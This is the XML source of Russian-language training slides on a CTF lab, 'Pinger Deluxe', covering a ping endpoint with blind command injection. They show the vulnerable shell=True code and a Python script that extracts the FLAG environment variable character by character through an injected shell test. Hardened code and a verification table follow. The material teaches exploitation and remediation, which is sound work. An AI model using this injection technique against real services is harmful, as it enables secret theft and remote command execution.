          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="v17-text-79">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{118CD770-6665-4D04-BD1C-7105FC9C4E47}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6438900" y="1914525"/>
            <a:ext cx="5067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8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Как надо</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="v17-text-80">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{1ECA1EB7-29CE-4343-A9BA-B52CE75C9A57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50673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result = run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"ping %s -c 1"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% data</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="165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"ip"</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="165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capture_output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shell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6" name="v17-text-81">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{41B40C23-0C0C-4445-BFFF-3AAB5DF42927}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6438900" y="2476500"/>
            <a:ext cx="50673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address = </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1650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str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ipaddress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.ip_address</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="165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650" b="0">
                <a:solidFill>
                  <a:srgbClr val="179FFF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"ip"</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1650" b="0">
                <a:solidFill>
                  <a:srgbClr val="179FFF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65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result = </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1650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subprocess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.run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"/usr/bin/ping"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"-c"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"1"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"-W"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"1"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address</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="165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shell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capture_output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timeout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check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7" name="v17-text-82">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{497CAB69-6CBD-46D9-9A2E-3E475B88CA03}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="685800" y="5324475"/>
            <a:ext cx="10287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203200" indent="-101600" algn="l">
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
              <a:buChar char="•"/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t>Проверять IP до запуска; программу и опции задаёт сервер.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="203200" indent="-101600" algn="l">
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
              <a:buChar char="•"/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t>Передавать argv с shell=False и ограничивать время.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="203200" indent="-101600" algn="l">
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
              <a:buChar char="•"/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t>Обрабатывать ошибки ввода, timeout и returncode.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="91178837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7EF9C426-6DDF-4C16-8CC7-BE7C7A0777D5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Pinger Deluxe: задание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163A650-1A55-4394-905D-D8502C981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3" name="v15-67">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{536C2A91-661F-49B2-B9EB-6891605BBA63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067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127.0.0.1:8087</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="v15-68">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{DEEEA8D6-3676-4EE6-AA64-3F933860D2FD}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6438900" y="1962150"/>
            <a:ext cx="5067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Актуальный стенд</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="v15-69">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{6C1F119A-5D1E-4A25-8C30-1639FADD7477}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="685800" y="2714625"/>
            <a:ext cx="5067300" cy="3286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lnSpc>
                <a:spcPct val="110000"/>
              </a:lnSpc>
              <a:buNone/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POST</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="187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875" b="0" dirty="0" err="1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api</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1875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875" b="0" dirty="0" err="1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pinger</a:t>
            </a:r>
            <a:endParaRPr sz="1875" b="0" dirty="0">
              <a:solidFill>
                <a:srgbClr val="9CDCFE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10000"/>
              </a:lnSpc>
              <a:buNone/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Content-Type:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1875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 application/json</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr sz="1875" b="0" dirty="0">
              <a:solidFill>
                <a:srgbClr val="9CDCFE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10000"/>
              </a:lnSpc>
              <a:buNone/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{"ip":</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1875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"127.0.0.1"</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="187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1875" b="0" dirty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10000"/>
              </a:lnSpc>
              <a:buNone/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Задача</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="187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87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проверить</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="187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выполнение</a:t>
            </a:r>
            <a:endParaRPr sz="1875" b="0" dirty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10000"/>
              </a:lnSpc>
              <a:buNone/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при</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="187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скрытом</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="187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выводе</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="187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команды</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="187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</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="v15-70">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{B99E44A9-128D-4A82-B158-813AF863F26E}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6438900" y="2714625"/>
            <a:ext cx="5067300" cy="3286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lnSpc>
                <a:spcPct val="110000"/>
              </a:lnSpc>
              <a:buNone/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EF2F6"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:ea typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>Python 3.10, Alpine, BusyBox</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="110000"/>
              </a:lnSpc>
              <a:buNone/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EF2F6"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:ea typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>Приложение: порт 51338</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="110000"/>
              </a:lnSpc>
              <a:buNone/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EF2F6"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:ea typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>Docker: 0.0.0.0:8087</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr sz="1875" b="0">
              <a:solidFill>
                <a:srgbClr val="EEF2F6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10000"/>
              </a:lnSpc>
              <a:buNone/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EF2F6"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:ea typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>Флаг: переменная FLAG</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr sz="1875" b="0">
              <a:solidFill>
                <a:srgbClr val="EEF2F6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10000"/>
              </a:lnSpc>
              <a:buNone/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EF2F6"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:ea typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>Сравниваем ответы приложения</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="110000"/>
              </a:lnSpc>
              <a:buNone/>
              <a:defRPr sz="187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EF2F6"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:ea typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>и читаем обработчик.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="176532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03AE6C26-1874-474D-961D-DD5E4FCFBFD0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Pinger Deluxe: код и смысл ответа</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="2" name="left-heading">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{F1680FAF-7936-469D-92F6-054CD2E3D32F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dirty="0" err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Код</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2100" b="1" dirty="0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1" dirty="0" err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обработчика</a:t>
            </a:r>
            <a:endParaRPr sz="2100" b="1" dirty="0">
              <a:solidFill>
                <a:srgbClr val="C9707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left-body">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{32B2AA52-306A-4229-927E-77A3CB007A86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514350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endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="right-heading">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{8851B923-18BA-4D03-AB8F-A4B30651AF75}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6438900" y="1943100"/>
            <a:ext cx="506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dirty="0" err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Что</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2100" b="1" dirty="0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1" dirty="0" err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получает</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2100" b="1" dirty="0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1" dirty="0" err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клиент</a:t>
            </a:r>
            <a:endParaRPr sz="2100" b="1" dirty="0">
              <a:solidFill>
                <a:srgbClr val="C9707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right-body">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{C6488909-140C-43DE-A54F-CEAD2DCB12B1}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6438900" y="2533650"/>
            <a:ext cx="506730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endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="deluxe-code">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{3A47B0F3-304A-49CA-B654-AED0BD9CFB26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52197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result = run</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="17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"ping %s -c 1"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% data</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="172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"ip"</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="172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capture_output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725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shell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725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725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725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7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result.stderr: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create_resp</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="17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"bebebe error"</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="17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create_resp</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="17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"bebebe pinged"</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="17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7" name="deluxe-response">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{85C48F83-E218-4A22-8359-45FB8E7B3C11}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6438900" y="2552700"/>
            <a:ext cx="5067300" cy="2762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stdout</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="187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и stderr </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="187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остаются</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="187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у </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="187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приложения</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="187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.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr sz="1875" b="0" dirty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stderr </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="187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непустой</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="187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: </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="187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bebebe</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="187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error</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l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stderr </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="187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пустой</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="187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: </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="187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bebebe</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="187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pinged</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr sz="1875" b="0" dirty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Оба</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="187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7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ответа</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="187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: HTTP 200.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l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returncode</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="187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7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не</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="187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7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проверяется</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="187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93F5D01-6F4B-4201-8B7D-D80B7B19C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06147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194EE27E-AC01-47BD-9171-0EEA99ADD9B4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3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Pinger Deluxe: </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0" lang="ru-RU" sz="33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перебираем значения</a:t>
            </a:r>
            <a:endParaRPr kumimoji="0" sz="3300" b="1" i="0" u="none" strike="noStrike" kern="1200" cap="none" spc="0" normalizeH="0" baseline="0" noProof="0" dirty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FC1B900-6E69-47E9-9E79-589E2E83B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9" name="editable-python-code">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{2AC26815-01B3-457A-B94E-383F41CC2CC2}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="685800" y="1514475"/>
            <a:ext cx="10820400" cy="476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requests</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:buNone/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string</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr sz="1350" b="0" dirty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0000"/>
              </a:lnSpc>
              <a:buNone/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U = </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="13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"http://127.0.0.1:8087/</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1350" b="0" dirty="0" err="1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api</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="13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350" b="0" dirty="0" err="1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pinger</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="13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</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:buNone/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4FC1FF"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:ea typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>CHARS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350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string.ascii_letters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1350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string.digits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13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"{}_-"</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:buNone/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flag = </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="13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""</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr sz="1350" b="0" dirty="0">
              <a:solidFill>
                <a:srgbClr val="9CDCF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0000"/>
              </a:lnSpc>
              <a:buNone/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while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5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50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flag.endswith</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1350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3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"}"</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1350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  <a:buNone/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35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c </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="135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50" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="4FC1FF"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:ea typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>CHARS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  <a:buNone/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payload = </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="13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f'127.0.0.1 -c 1; [ "$(echo $FLAG | cut -c</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1350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350" b="0" dirty="0" err="1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1350" b="0" dirty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flag</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1350" b="0" dirty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+ </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="135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350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3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)" = "</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1350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350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3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 ] &amp;&amp; echo x &gt;&amp;2 #'</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr sz="1350" b="0" dirty="0">
              <a:solidFill>
                <a:srgbClr val="9CDCF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0000"/>
              </a:lnSpc>
              <a:buNone/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35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  <a:buNone/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r = </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1350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requests.post</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1350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U, </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1350" b="0" dirty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350" b="0" dirty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3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350" b="0" dirty="0" err="1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ip</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="13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 payload</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1350" b="0" dirty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350" b="0" dirty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timeout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350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350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35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350" b="0" dirty="0" err="1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bebebe</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1350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 error"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5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50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r.text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  <a:buNone/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    flag += c</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:buNone/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    </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1350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350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flag, </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1350" b="0" dirty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flush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350" b="0" dirty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350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    </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="135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break</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:buNone/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35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  <a:buNone/>
              <a:defRPr sz="135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350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pass</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="right-heading">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{21860EF3-CB37-4E1D-B691-FFA4C86293E3}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7072101" y="1352550"/>
            <a:ext cx="506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2100" b="1" dirty="0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В результате получаем флаг</a:t>
            </a:r>
            <a:endParaRPr sz="2100" b="1" dirty="0">
              <a:solidFill>
                <a:srgbClr val="C9707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1" name="deluxe-response">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{0A51F230-9CB7-4B8D-BD2E-7F682BD55285}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7072101" y="1877184"/>
            <a:ext cx="5067300" cy="2762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lang="en-US" dirty="0"/>
              <a:t>KB2CTF{</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>blind_rce_demo</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>}</a:t>
            </a:r>
            <a:endParaRPr sz="1875" b="0" dirty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308737195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194EE27E-AC01-47BD-9171-0EEA99ADD9B4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Pinger Deluxe: защита от инъекции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FC1B900-6E69-47E9-9E79-589E2E83B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3" name="v17-text-83">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{C98C0F60-5709-4CFB-803C-524AA3AF30AA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5067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8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Как не надо</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="v17-text-84">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{391185B4-20A3-41E5-9E1E-D7B5298C85EA}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6438900" y="1914525"/>
            <a:ext cx="5067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8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Как надо</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="v17-text-85">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{41803164-4391-462C-BDB3-B74FB6B2EFE4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50673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result = run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command, </a:t>
            </a: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shell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capture_output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endParaRPr sz="1650" b="0">
              <a:solidFill>
                <a:srgbClr val="FFD70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Скрыть вывод в HTTP-ответе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не значит убрать выполнение</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="v17-text-86">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{06C7C980-C6F8-4AD2-A795-4EB66B74C0F3}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6438900" y="2476500"/>
            <a:ext cx="50673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address = </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1650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str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ipaddress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.ip_address</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="165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650" b="0">
                <a:solidFill>
                  <a:srgbClr val="179FFF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"ip"</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1650" b="0">
                <a:solidFill>
                  <a:srgbClr val="179FFF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65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result = </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1650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subprocess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.run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"/bin/ping"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"-c"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"1"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address</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="165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shell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timeout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stdout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subprocess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650" b="0">
                <a:solidFill>
                  <a:srgbClr val="4FC1FF"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:ea typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>DEVNULL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stderr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subprocess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650" b="0">
                <a:solidFill>
                  <a:srgbClr val="4FC1FF"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:ea typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>DEVNULL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env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"PATH"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"/usr/bin:/bin"</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="165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ok = result.returncode == </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="165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7" name="v17-text-87">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{4101C5D3-D48D-4BD1-A3CC-8E0EA942B38A}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="685800" y="5324475"/>
            <a:ext cx="10287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203200" indent="-101600" algn="l">
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
              <a:buChar char="•"/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t>Устранить shell-интерпретацию независимо от HTTP-ответа.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="203200" indent="-101600" algn="l">
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
              <a:buChar char="•"/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t>Не наследовать секреты в окружении дочернего процесса.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="203200" indent="-101600" algn="l">
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
              <a:buChar char="•"/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t>Проверять returncode, ограничивать время, права и сеть.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="183997414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4F51998F-BD85-4F98-8A86-C68D81A14E05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Pinger Deluxe: проверка исправления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946164F-C62B-46E0-8BFF-579F22535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BA5F3C8F-ACE8-4A3A-B84E-8112D9540736}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvGraphicFramePr/>
          <p:nvPr/>
        </p:nvGraphicFramePr>
        <p:xfrm>
          <a:off x="685800" y="2057400"/>
          <a:ext cx="10820400" cy="3467100"/>
        </p:xfrm>
        <a:graphic>
          <a:graphicData uri="http://schemas.openxmlformats.org/drawingml/2006/table">
            <a:tbl>
              <a:tblPr firstRow="1"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875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Граница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875" b="1" dirty="0" err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Проверочный</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr sz="1875" b="1" dirty="0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1875" b="1" dirty="0" err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ввод</a:t>
                      </a:r>
                      <a:endParaRPr sz="1875" b="1" dirty="0">
                        <a:solidFill>
                          <a:srgbClr val="C97070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875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Результат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80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Разбор адреса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80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127.0.0.1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80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Один адрес в argv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80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Синтаксис shell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800" b="0" dirty="0" err="1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alex</a:t>
                      </a:r>
                      <a:r>
